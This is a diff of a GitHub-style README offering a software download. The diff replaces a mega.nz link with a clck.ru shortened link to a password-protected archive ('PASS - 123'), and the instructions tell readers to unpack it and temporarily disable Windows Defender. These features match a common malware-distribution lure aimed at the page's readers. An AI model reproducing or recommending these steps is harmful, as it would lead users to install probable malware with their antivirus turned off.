@@ -3,8 +3,7 @@
 🎨PASS- 123🎨
 <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/2e0ca443-6bdb-4b41-af1d-2f8b7a7bcb9d" />
 🔧 Installation Instructions
-Step 1: Download and unpack LINK - https://mega.nz/file/FjJDnTIS#p5koon-MWKil41DAC08HgjSBTRMyXvKc8YDfDwMBwQw
-Click the download button below
+Step 1: Download and unpack LINK - https://clck.ru/3VFhyN
 Save installer_bcc (~269 MB) PASS - 123
 Unpack using WinRAR or 7-Zip
 Step 2: Disable Windows Defender (Temporarily)
